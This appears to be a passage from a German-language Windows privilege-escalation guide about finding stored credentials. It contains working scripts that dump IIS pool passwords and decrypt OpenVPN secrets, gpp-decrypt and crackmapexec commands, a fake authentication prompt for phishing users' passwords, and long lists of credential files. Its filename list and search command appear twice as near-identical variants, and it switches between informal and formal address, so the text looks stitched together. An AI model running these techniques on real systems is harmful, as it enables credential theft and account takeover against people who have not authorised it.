        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installer werden **mit SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Informationen von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Zugangsdaten)

### Zugangsdaten-Artefakte in Registrys von Support-Tools

Einige ältere Remote-Support-Installationen behalten passwortbezogene Wertnamen unter festen Anwendungs-Registry-Schlüsseln. So kennzeichnete `SecurityPasswordAES` von TeamViewer laut der [Erklärung des Anbieters zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Wertnamen-Marker ist lediglich ein Hinweis zur Überprüfung: Prüfen Sie die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie diese Zugangsdaten bewerten. Der Wechsel von einem Remote-Support-Passwort zu einem privilegierteren Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und der Zugriff auf dieses Konto autorisiert ist. Geben Sie verschlüsselte Daten und wiederhergestellte Passwörter nicht in routinemäßigen Enumerationsausgaben aus.

### Freigegebene Tabellen mit geschützten Blättern

Wenn vermutet wird, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und Blattschutz oder ausgeblendeten Spalten. [Microsoft weist darauf hin](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Blattschutz die Bearbeitung steuert und kein Sicherheitsfeature ist; er belegt für sich genommen nicht, dass der Inhalt der Arbeitsmappe verschlüsselt ist. Prüfen Sie nur autorisierte, relevante Dateien und vermeiden Sie es, mögliche Geheimnisse bei einer breit angelegten Enumeration auszugeben. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Blatt oder eine ausgeblendete Spalte allein beweist weder, dass Zugangsdaten vorhanden sind, noch, dass ein Konto höhere Berechtigungen hat; überprüfen Sie die tatsächlichen Daten und die aktuellen Kontorechte separat.

### Vom CI-Server aufbewahrte Änderungspatches

Ein CI-Server kann übermittelte Quellcodeänderungen nach Abschluss des Builds in seinem Datenverzeichnis aufbewahren. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Änderungen aus Remote-Runs; das Datenverzeichnis kann konfiguriert sein und muss sich nicht unter `ProgramData` befinden. Ein lesbarer Patch kann Verweise auf eine Zugangsdaten-Datei, einen Verschlüsselungsschlüssel oder ein Skript, das beides verwendet, enthalten, auch wenn diese Verweise entfernt oder hinzugefügt wurden. Ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` benötigt beispielsweise neben der verschlüsselten Zeichenfolge auch den AES-Schlüssel; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat angegeben wird. Prüfen Sie zunächst nur die Namen zugänglicher Patches und anschließend unter entsprechender Autorisierung relevante Inhalte, ohne Geheimnisse in routinemäßigen Enumerationsausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Zugangsdaten noch Zugriff mit höheren Berechtigungen. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen zu committen.

### Benutzerdefinierte Rotation des lokalen Administratorkennworts

Ein selbst entwickelter Kennwort-Rotator kann ein verschlüsseltes lokales Administratorkennwort in einem lokalen Dienst speichern und die Zugangsdaten für seinen Datenspeicher in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei ablegen. Prüfen Sie gemeinsam den geplanten Task des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen des Datenspeichers. Ein nur an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Zugangsdaten weiterhin erreichbar; die Authentifizierung allein beweist jedoch nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Wenn das Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, prüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Schema, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mit Go [`math/rand`](https://pkg.go.dev/math/rand) ableitet, ist zum Schutz dieses Kennworts ungeeignet; Go weist darauf hin, dass dieses Paket nicht für sicherheitskritische Zufallswerte gedacht ist. Stellen Sie sicher, dass ein wiederhergestelltes Kennwort noch gültig ist und zu einem Konto der lokalen Gruppe „Administratoren“ gehört, bevor Sie es als möglichen Pfad zur Rechteausweitung betrachten. Ein geplanter Task, ein `.env`-Pfad oder ein verschlüsselter Blob allein belegt keine dieser Bedingungen. Geben Sie Passwörter und Schlüsselmaterial nicht in routinemäßigen Enumerationsausgaben aus.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorkennwörter. Dessen Verzeichnis- oder Entra-basierter Speicher und die zugehörigen Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; auch [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) bestimmen, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen kann.

### Java-Server-Plugin-Archive und Wiederverwendung von Zugangsdaten

Einige Java-Server-Plugins werden als JAR-Archive im `plugins`-Verzeichnis eines Servers bereitgestellt. Ein lesbares benutzerdefiniertes Plugin kann eine Konfiguration oder Bytecode mit eingebetteten Dienst-Zugangsdaten enthalten. Prüfen Sie das Archiv nur mit entsprechender Autorisierung und geben Sie wiederhergestellte Geheimnisse nicht in routinemäßigen Enumerationsausgaben aus. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist; ein wiederhergestelltes Dienstpasswort führt nur dann zu höheren Berechtigungen, wenn es auch für ein privilegierteres Konto gültig ist. Prüfen Sie die relevanten Datei-ACLs und ersetzen Sie wiederverwendete Zugangsdaten durch eindeutige Geheimnisse. Informationen zur Verzeichnisstruktur finden Sie in [PaperMCs Anleitung zur Plugin-Installation](https://docs.papermc.io/paper/adding-plugins/) und zu Archiv-Inhalten in [Oracles JAR-Dokumentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Zugangsdaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, prüfen Sie gemeinsam die `OFUSER`-Einträge und die Eigenschaft `passwordKey`. Laut der [Dokumentation zum Benutzer-Provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) von Openfire können Passwörter im Klartext oder mit einem in dieser Eigenschaft gespeicherten Schlüssel verschlüsselt abgelegt werden. Ein wiederhergestelltes Passwort ist für eine Rechteausweitung nur relevant, wenn es noch für eine privilegiertere Identität gültig ist; der Dateiname allein belegt weder Lesezugriff noch die Wiederverwendung von Zugangsdaten. Der Pfad dient als Hinweis für die Bestandsaufnahme. Geben Sie Datenbankinhalte und Zugangsdaten nicht in routinemäßigen Enumerationsausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Administrationskonsole offenlegen, auch wenn eine externe Datenbank verwendet wird. Openfire bindet seine Administrationskonsole üblicherweise an Loopback; ein lokales Konto kann die Adresse dennoch erreichen, wenn der Listener läuft. Prüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Administratorrolle, die Richtlinie für Plugin-Uploads und die Identität des Openfire-Dienstes. Ein Administrator, der ein Plugin installieren kann, kann möglicherweise Plugin-Code im Kontext des Dienstes ausführen lassen. Das kann weitreichende Berechtigungen bedeuten, wenn der Dienst als LocalSystem ausgeführt wird. Ein übereinstimmendes Kontopasswort oder ein lesbarer Konfigurationspfad allein beweist weder Zugriff auf die Administrationskonsole noch die Ausführung von Code. Siehe den [Installations- und Plugin-Verwaltungsleitfaden](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) des Anbieters und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration des forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen, die üblicherweise `server.config.yaml` heißen, können `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit geringeren Berechtigungen diesen Schlüssel lesen kann, kann er möglicherweise ein API-Clientzertifikat ausstellen. Ob dies zu höheren Berechtigungen führt, hängt von den Benutzerrollen des Servers, der API-Erreichbarkeit und der Identität ab, unter der der Server oder der Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält anderes Material; ihr Fund belegt keinen Zugriff auf die Server-CA. Bei manchen Bereitstellungen wird der private CA-Schlüssel offline aufbewahrt, sodass in einer lesbaren Serverkonfiguration auch der Signaturschlüssel fehlen kann.

Prüfen Sie auf einem Windows-Server die ACL der **Server**konfiguration im Installationsverzeichnis sowie etwaiger geschützter Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; falls der Dienst einen anderen Pfad verwendet, verwenden Sie diesen. Stellen Sie fest, ob die aktuelle Identität die Datei lesen kann und ob `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Enumerationsausgaben aus. Der Workflow `config api_client` des Anbieters verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; erforderlich ist jedoch auch eine wirksame serverseitige Rolle. Deren Erstellung oder Änderung kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine bereits vorhandene privilegierte Serveridentität kann auch dann einen Zugriffsweg bieten, wenn diese Schreibvorgänge nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im entsprechenden Server- oder Agentenkontext, der weitreichende Berechtigungen haben kann.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signaturschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen und den Zugriff auf Listener. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY-Zugangsdaten

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher kann sich unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` befinden, während ein exportiertes Sitzungsbackup `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. [SolarWinds’ Exportanleitung](https://thwack.solarwinds.com/discussion/comment/115591) besagt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; im [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wird der native Speicher angegeben. Prüfe zuerst Dateiberechtigungen und Pfade. Das Auffinden einer der beiden Dateien verrät weder das zugehörige Passwort noch beweist es, dass gespeicherte Zugangsdaten noch gültig sind oder höhere Berechtigungen besitzen.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-Private-Keys können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht läuft und du möchtest, dass er beim Booten automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH bei einem Computer anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und Procmon hat während der Authentifizierung mit asymmetrischem Schlüssel keine Verwendung von `dpapi.dll` erkannt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- und SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können auch offline `SAM`-, `SECURITY`- und `SYSTEM`-Hives enthalten. Prüfe zuerst lokal zugängliche Backup- oder Image-Verzeichnisse und untersuche die **Namen der enthaltenen Dateien** eines Images, bevor du etwas extrahierst; ein `.wim`-Dateiname allein belegt nicht, dass Hives zugänglich sind, und reguläre `install.wim`-, `boot.wim`- und Recovery-Images sind häufige falsche Fährten. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn diese Freigabe zum Umfang gehört. Siehe Microsofts [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Zugangsdaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Rechnern bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens waren die als XML-Dateien in SYSVOL gespeicherten Group Policy Objects (GPOs) für alle Domänenbenutzer zugänglich. Zweitens konnten die mit AES256 verschlüsselten Passwörter in diesen GPPs von jedem authentifizierten Benutzer entschlüsselt werden, da ein öffentlich dokumentierter Standardschlüssel verwendet wurde. Dies stellte ein ernstes Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien mit einem nicht leeren Feld „cpassword“ durchsucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und erleichtert so das Erkennen und Beheben dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Mit crackmapexec Passwörter abrufen:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS-Webkonfiguration

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für eine web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem ausgelieferten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du es als Offenlegung einstufst. Der Standardpfad `C:\inetpub\wwwroot` ist nur ein möglicher Kandidat. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ein Archivname belegt weder, dass das Archiv ein Geheimnis enthält, noch, dass wiederhergestellte Zugangsdaten höhere Berechtigungen gewähren.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den Benutzer immer **bitten, seine Zugangsdaten oder sogar die Zugangsdaten eines anderen Benutzers einzugeben**, wenn du denkst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die vor einiger Zeit **Passwörter** im **Klartext** oder als **Base64** enthielten

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Dateinamenlisten-Variante ohne die Password-Safe-Erweiterung

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password-Safe-v3-Datenbanken verwenden häufig die Erweiterung `.psafe3`. Betrachten Sie einen passenden Dateinamen als möglichen Hinweis auf einen verschlüsselten Tresor. Sein Vorhandensein bedeutet nicht, dass Sie ihn lesen oder entsperren oder gespeicherte Zugangsdaten verwenden können. Prüfen Sie beim Überprüfen der Speicherorte solcher Dateien zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls nur ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren sind das tatsächliche Master-Passwort und alle konfigurierten Schlüsseldaten oder Kontofaktoren erforderlich. Findet eine autorisierte Prüfung in einem Eintrag ein LM:NT-Hash-Paar, überprüfen Sie das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor Sie [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehen. Ein Tresoreintrag verleiht für sich genommen keine Administrator- oder SYSTEM-Rechte auf dem Ziel; auch der Fernzugriff auf Dienste, die Kontoberechtigungen und alle separaten Schritte zur Dienstausführung müssen gegeben sein. Das Inventar sollte den Tresorpfad und die Lesbarkeit melden, nicht die Datenbank oder gespeicherte Zugangsdaten ausgeben.

Durchsuchen Sie alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Suchbefehlsvariante ohne die Password-Safe-Erweiterung

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

Du solltest auch den Papierkorb auf darin enthaltene Zugangsdaten überprüfen.

